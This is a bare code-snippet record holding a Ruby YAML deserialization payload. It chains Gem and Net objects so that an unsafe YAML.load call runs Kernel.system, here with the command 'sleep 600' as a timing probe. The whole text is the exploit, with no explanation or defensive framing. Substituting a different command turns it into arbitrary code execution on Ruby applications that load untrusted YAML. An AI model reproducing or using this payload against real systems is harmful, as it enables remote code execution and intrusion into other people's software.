---
id: a4d530da-0e9d-440b-b31a-de164403ecbe
type: code
language: yaml
verified: false
created_at: '2023-04-06T03:55:59.522982+00:00'
updated_at: '2023-04-06T03:55:59.525855+00:00'
---

# Code Snippet a4d530da

**Language**: yaml

```yaml
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```
